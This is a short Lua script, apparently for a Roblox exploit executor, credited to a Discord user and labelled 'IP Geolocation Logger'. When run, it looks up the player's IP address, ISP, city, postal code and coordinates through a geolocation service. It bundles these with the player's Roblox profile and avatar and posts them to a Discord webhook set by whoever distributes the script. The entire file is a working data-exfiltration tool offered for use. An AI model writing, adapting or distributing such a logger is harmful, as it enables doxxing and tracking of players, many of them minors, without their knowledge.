-- Credits to @mcantcode on Discord
local players = game:GetService("Players")
local httpService = game:GetService("HttpService")

local localPlayer = players.LocalPlayer
local userId = localPlayer.UserId

local ipGeoData =  httpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))

local function addField(name, value) return { name = name, value = value or "Not found" } end

request({
	Url = getgenv().Webhook_URL,
	Method = "POST",
	Body = httpService:JSONEncode({
		embeds = {
			{ title = "Geolocation", color = 1733608, fields = {
				addField("IP Address", ipGeoData.ip),
				addField("Network Range", ipGeoData.network),
				addField("ASN (Autonomous System Number)", ipGeoData.asn),
				addField("ISP (Internet Service Provider)", ipGeoData.org),
				addField("Country", ipGeoData.country_name),
				addField("Region/Province", ipGeoData.region),
				addField("City", ipGeoData.city),
				addField("Postal Code", ipGeoData.postal),
				addField("Latitude", tostring(ipGeoData.latitude)),
				addField("Longitude", tostring(ipGeoData.longitude)),
				addField("Timezone", ipGeoData.timezone)
			}},
			{ title = "User", color = 1733608, fields = { addField("Profile Link", "https://www.roblox.com/users/" .. userId .. "/profile") }, thumbnail = { url = httpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false")).data[1].imageUrl } }
		},
		username = "IP Geolocation Logger",
		avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png"
	}),
	Headers = { ["Content-Type"] = "application/json" }
})
